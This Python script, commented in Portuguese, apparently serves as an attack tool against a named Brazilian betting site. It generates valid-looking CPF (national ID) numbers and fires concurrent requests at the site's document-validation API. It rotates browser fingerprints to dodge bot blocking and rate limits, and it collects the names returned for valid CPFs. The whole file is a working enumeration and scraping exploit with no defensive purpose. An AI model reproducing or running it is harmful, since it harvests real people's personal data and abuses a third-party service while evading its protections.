#!/usr/bin/env python3
"""
Injetor de 20 Requisições Simultâneas
=====================================
Faz 20 requisições paralelas usando diferentes fingerprints
"""
import random
import time
import json
import concurrent.futures
from curl_cffi import requests

# Fingerprints VÁLIDOS (testados e funcionando)
IMPERSONATIONS = [
    "chrome120", "chrome119", "chrome110", "chrome107", "chrome104",
    "chrome101", "chrome100", "chrome99", "edge101", "edge99",
    "safari15_5", "safari15_3", "safari17_0", "chrome116",
    # Repetir para ter 20 diferentes
    "chrome120", "chrome119", "chrome110", "chrome107", "chrome104", "chrome101"
]

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def formatar_cpf(cpf):
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"

def fazer_requisicao(thread_id):
    """Cada thread usa seu próprio fingerprint"""
    impersonation = IMPERSONATIONS[thread_id % len(IMPERSONATIONS)]
    cpf = gerar_cpf()
    
    try:
        session = requests.Session(impersonate=impersonation)
        
        response = session.post(
            "https://7k.bet.br/api/documents/validate",
            json={"number": cpf, "type": "cpf"},
            headers={
                "Content-Type": "application/json",
                "Origin": "https://7k.bet.br",
                "Referer": "https://7k.bet.br/",
                "Accept": "application/json"
            },
            timeout=15
        )
        
        status = response.status_code
        
        # Se válido, extrai dados
        nome = None
        if status == 200:
            try:
                data = response.json()
                nome = data.get("data", {}).get("name", "N/A")
            except:
                pass
        
        return {
            "thread_id": thread_id,
            "cpf": cpf,
            "status": status,
            "nome": nome,
            "fingerprint": impersonation
        }
        
    except Exception as e:
        return {
            "thread_id": thread_id,
            "cpf": cpf,
            "status": -1,
            "error": str(e)[:50],
            "fingerprint": impersonation
        }

def injetar_requests(num_requests=20):
    """Injeta N requisições simultâneas"""
    print(f"\n🚀 INJETANDO {num_requests} REQUISIÇÕES SIMULTÂNEAS...")
    print("="*60)
    
    inicio = time.time()
    
    # Executa em paralelo
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = [executor.submit(fazer_requisicao, i) for i in range(num_requests)]
        resultados = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    tempo = time.time() - inicio
    
    # Ordena por thread_id
    resultados.sort(key=lambda x: x["thread_id"])
    
    # Mostra resultados
    print(f"\n📊 RESULTADOS ({tempo:.2f}s para {num_requests} requisições)")
    print("-"*60)
    
    validos = []
    stats = {"200": 0, "400": 0, "403": 0, "429": 0, "erro": 0}
    
    for r in resultados:
        tid = r["thread_id"] + 1
        cpf_fmt = formatar_cpf(r["cpf"])
        status = r["status"]
        fp = r["fingerprint"][:10]
        
        if status == 200:
            nome = r.get("nome", "N/A")
            print(f"[{tid:2d}] ✅ VÁLIDO | {cpf_fmt} | {nome[:25]} | {fp}")
            validos.append({"cpf": cpf_fmt, "nome": nome})
            stats["200"] += 1
        elif status == 400:
            print(f"[{tid:2d}] ❌ 400    | {cpf_fmt} | {fp}")
            stats["400"] += 1
        elif status == 403:
            print(f"[{tid:2d}] 🚫 403    | {cpf_fmt} | {fp}")
            stats["403"] += 1
        elif status == 429:
            print(f"[{tid:2d}] ⏳ 429    | {cpf_fmt} | {fp}")
            stats["429"] += 1
        else:
            print(f"[{tid:2d}] 💥 ERRO   | {cpf_fmt} | {r.get('error', 'Unknown')[:30]}")
            stats["erro"] += 1
    
    # Resumo
    print("\n" + "="*60)
    print("📈 RESUMO:")
    print(f"   ✅ Válidos (200): {stats['200']}")
    print(f"   ❌ Inválidos (400): {stats['400']}")
    print(f"   🚫 Bloqueados (403): {stats['403']}")
    print(f"   ⏳ Rate Limit (429): {stats['429']}")
    print(f"   💥 Erros: {stats['erro']}")
    print(f"\n   ⚡ Velocidade: {num_requests/tempo:.1f} req/s")
    print(f"   ⏱️  Tempo total: {tempo:.2f}s")
    
    if validos:
        print(f"\n🎯 CPFs VÁLIDOS ENCONTRADOS: {len(validos)}")
        for v in validos:
            print(f"   {v['cpf']} - {v['nome']}")
    
    return resultados

def main():
    print("="*60)
    print("💉 INJETOR DE REQUISIÇÕES SIMULTÂNEAS")
    print("="*60)
    print(f"   Fingerprints disponíveis: {len(IMPERSONATIONS)}")
    
    # Faz 3 rodadas de 20 requisições
    for rodada in range(1, 4):
        print(f"\n\n{'#'*60}")
        print(f"   RODADA {rodada}/3")
        print(f"{'#'*60}")
        
        injetar_requests(20)
        
        if rodada < 3:
            print(f"\n⏳ Aguardando 3s antes da próxima rodada...")
            time.sleep(3)
    
    print("\n" + "="*60)
    print("✅ INJEÇÃO COMPLETA!")
    print("="*60)

if __name__ == "__main__":
    main()

